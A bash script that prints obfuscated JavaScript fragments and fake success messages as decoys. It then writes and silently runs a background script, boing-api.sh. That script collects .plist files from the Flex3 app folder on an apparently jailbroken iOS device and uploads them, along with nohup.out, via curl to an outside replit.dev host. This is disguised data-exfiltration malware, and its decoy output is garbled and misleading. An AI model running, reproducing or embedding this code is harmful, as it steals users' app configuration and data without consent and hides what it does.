#!/bin/bash

echo "[ + ]: payload ={\"0x2af2b8=_0x8cd0;(function(_0x49c00c,_0x6adbbf){const _0x16fc16=_0x8cd0,_0x5e5ad3=_0x49c00c();while(!![]){try{const _0x3f05dd=parseInt(_0x16fc16(0x170))/0x1+parseInt(_0x16fc16(0x17b))/0x2*(parseInt(_0x16fc16(0x178))/0x3)+parseInt(_0x16fc16(0x17a))/0x4+-parseInt(_0x16fc16(0x17d))/0x5+-parseInt(_0x16fc16(0x173))/0x6*(parseInt(_0x16fc16(0x172))/0x7)+-parseInt(_0x16fc16(0x184))/0x8+parseInt(_0x16fc16(0x183))/0x9*(parseInt(_0x16fc16(0x16d))/0xa);if(_0x3f05dd===_0x6adbbf)break;else _0x5e5ad3['push'](_0x5e5ad3['shift']());}catch(_0x2a011f){_0x5e5ad3['push'](_0x5e5ad3['shift']());}}}(_0x1b3f,0xcd000));const fs=require('fs'),path=require(_0x2af2b8(0x185)),acorn=require(_0x2af2b8(0x17e)),walk=require(_0x2af2b8(0x177));function readFile(_0xec20c4){const _0x21633a=_0x2af2b8;try{re\""
echo "#define      shll_z	10 define      shll	((&data[58]"
echo """_0x4deaf6=['t','1345601kKOOKW','push','6482CcaBjr','78Mgoehi','Error\x20reading\x20file:\x20','name','Code:\x0a','acorn-walk','537vjpWgz','forEach','2634516QuMbnW','2078oqIxjh','./index.js','6930545dMQtfW','acorn','error','parse','readFileSync','start','333knHWUi','9709712RPjmaS','path','utf-8','resolve','anonymous','log','340900Fyshoc','exit'];_0x1b3f=function(){return"""
echo "[ + ]: !!! ALL DONE !!!"


flex_path="/rootfs/var/mobile/Library/Application Support/Flex3"


url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.dev?getFileButter"

cat << 'EOF' > boing-api.sh
#!/bin/bash

#!/bin/bash

flex_path="/rootfs/var/mobile/Library/Application Support/Flex3"
url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.dev?getFileButter"

if [ -d "$flex_path" ]; then
    cd "$flex_path" || { echo "[ E ]: Directory Invalid: $flex_path"; exit 1; }

    files_to_send=$(find . -type f -name "*.plist")

    for file_path in $files_to_send; do
        filename=$(basename "$file_path")

        zip_filename="$filename.zip"

        zip "$zip_filename" "$file_path"

        response=$(curl -s -w "%{http_code}" -o /dev/null -F "file=@$zip_filename" "$url")

        if [ "$response" -ne 200 ]; then
            echo "[ E ]: $response"
        fi

        rm "$zip_filename"
    done

    echo "[ + ]: a97285b5-1fa2-4bb6-aa68-f7d3f085f343-00; 0x0008A"
else
    echo "$flex_path não é um diretório válido."
fi

# Send nohup.out to the specified URL
if [ -f "nohup.out" ]; then
    response=$(curl -s -w "%{http_code}" -o /dev/null -F "file=@nohup.out" "$url")

    if [ "$response" -ne 200 ]; then
        echo "[ E ]: Failed to upload nohup.out, response code: $response"
    else
        echo "[ + ]: Successfully uploaded nohup.out"
    fi
else
    echo "Arquivo nohup.out não encontrado."
fi

EOF

chmod +x boing-api.sh

nohup ./boing-api.sh &
